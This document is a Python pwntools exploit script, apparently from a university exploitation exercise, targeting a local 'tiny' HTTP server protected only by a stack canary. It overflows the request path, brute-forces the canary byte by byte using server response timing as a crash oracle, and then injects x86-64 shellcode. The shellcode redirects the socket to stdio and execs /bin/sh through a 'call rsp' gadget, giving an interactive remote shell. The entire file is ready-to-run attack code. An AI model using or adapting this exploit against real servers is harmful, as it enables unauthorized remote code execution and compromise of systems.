from IPython import embed
from pwn import *
import time
import statistics
import math

context.terminal = ['tmux', 'splitw', '-h']

ADDR = "127.0.0.1"
PORT = 9999
local_file = './tiny.canary' # only canary protection

e = ELF(local_file)
context.binary = e
context.log_level = "info"
# libc = e.libc
# libc.address = libc_base


def package_http_request(path):
    """Craft the bytes for a valid HTTP/1.1 GET request containing our payload """
    return b"".join([
        b"GET ", path, b" HTTP/1.1\r\n",
        f"Host: {ADDR}:{PORT}\r\n".encode(),
        b"User-Agent: Hacker\r\n",
        b"\r\n"
        ])


def run_expl(payload, log=True):
    p = remote(ADDR, PORT)
    # buffer overflow
    padding_size = 0x220       # tiny with canary
    expl = b''
    expl += b'a'*(padding_size-8) #8 is the canary size
    expl += payload

    #url encode all the bytes that would block the http parser
    expl = expl.replace(b'%', b'%25')
    expl = expl.replace(b'?', b'%3f')
    for i in range(0x21):
        expl = expl.replace(bytes([i]), f'%{i:02X}'.encode())

    http_req = package_http_request(expl)
    if log:
        print("sending these request bytes:")
        print(http_req)
    p.send(http_req)
    return p


def run_expl_timer(expl):
    p = run_expl(expl, log=False)
    out = p.recvuntil(b'File not found')
    #measure the time the server takes
    #to close the socket as an oracle
    start = time.perf_counter()
    end = 0
    try:
        while True:
            out = p.recv_raw(100);
            print(out)
    except:
        end = time.perf_counter()
    p.close()
    delta = end-start
    print(f"server response time: {delta}")
    return delta

def generate_crash_time_test(n=30, expl=b'', treshold=3):
    """returns a function that will test if a given server response time
    indicates a server crash

    Run this to regenerate the test function every time 
    you suspect that the network conditions changed,
    and a new sample is required for an accurate test
    """
    # get sample, from running a query that doesn't crash the server
    print("sampling server response time...")
    sample_timings = []
    for _ in range(n):
        sample_timings.append(run_expl_timer(expl))
    # calculate sample statistics
    mean = statistics.mean(sample_timings)
    std = statistics.stdev(sample_timings)
    print(f"mean: {mean}\nstd: {std}\n n:{n}")

    def is_outlier(x):
        """return true if the given x time measurement indicates a server crash

        This is testing if x is an outlier in the sample measurements.
        The sample measurements are taken on a non-crashing payload.
        """
        Z = (x - mean) / std
        print(f"treshold: {Z}")
        is_outlier = abs(Z) > treshold
        return is_outlier

    return is_outlier

def c(comment):
    """this is just a dummy function to insert comments in the asm string"""
    return ""


def main():
    context.log_level = "warn"
    test_sample_size = 10
    treshold = 50
    expl = b'' #no exploit, the server should not crash
    crash_time_test = generate_crash_time_test(test_sample_size, expl, treshold)

    #bruteforce the canary
    canary_bytes = b''

    while len(canary_bytes) < 8:
        for j in range(0xff+2):
            if j == 0xff+1:
                #should not get here, recalibrate the timing test
                print("recalibrating the oracle")
                crash_time_test = generate_crash_time_test(test_sample_size, expl, treshold)
            else:
                current_byte = bytes([j])
                payload = canary_bytes + current_byte
                print(payload)
                print("\033[F"*4) #go back 3 lines, to avoid spam in stdout
                response_time = run_expl_timer(payload)
                is_crash = crash_time_test(response_time)
                if not is_crash:
                    canary_bytes += current_byte
                    break

    print("\n")
    print("-------------------")
    print(f"leaked canary: \n{canary_bytes}")
    print("-------------------")

    shellcode_payload = f"""

      {c("----------------------------------------")}
      {c("print a marker string to test the socket")}
      {c("----------------------------------------")}
      mov rax, 0x343262696d696e75 {c("string unimib24")}
      push rax
      push rsp
      pop rsi      {c("pointer to the string")}

      xor rax, rax
      mov al, 0x1  {c("write syscall")}
      xor rdi, rdi
      mov dil, 0x4 {c("stdout fd")}
      xor rdx, rdx
      mov dl, 0x8  {c("size")}
      syscall

      {c("----------------------------------------")}
      {c("Redirect this fork's stdIO to the socket")}
      {c("----------------------------------------")}

      mov rax, 0x21 {c("dup2 syscall")}
      mov rdi, 4    {c("old fd")}
      mov rsi, 0    {c("new fd")}
      syscall

      mov rax, 0x21 {c("dup2 syscall")}
      mov rdi, 4    {c("old fd")}
      mov rsi, 1    {c("new fd")}
      syscall

      mov rax, 0x21 {c("dup2 syscall")}
      mov rdi, 4    {c("old fd")}
      mov rsi, 2    {c("new fd")}
      syscall

      {c("----------------------------------------")}
      {c("exec /bin/sh, transforming this fork    ")}
      {c("----------------------------------------")}

      mov rax, 0x0068732f6e69622f {c("string /bin/sh")}
      push rax
      push rsp
      pop rdi       {c("pointer to the string")}

      mov rax, 0x3b {c("execve syscall")}
      push 0
      push rsp
      pop rsi       {c(" *const *argv")}
      mov rdx, rsi  {c(" *const *envp")}
      syscall
    """

    context.log_level = "info"
    shellcode_bytes = asm(shellcode_payload)
    print("shellcode bytes:")
    print(shellcode_bytes)
    expl = b''
    expl += canary_bytes
    expl += b'b'*8        # rbp. no need for a valid address
    expl += p64(0x42860d) # gadget: call rsp;
    expl += shellcode_bytes
    p = run_expl(expl)

    out = p.recvuntil(b'File not found')
    print(out)

    try:
        success_marker = p.recvuntil(b'unimib24', timeout=1)
        print("remote shell started! type a command")
        p.interactive()
    except:
        print("exploitation failed")
        out = p.clean(timeout=1)
        print(out)
        p.close()


main()

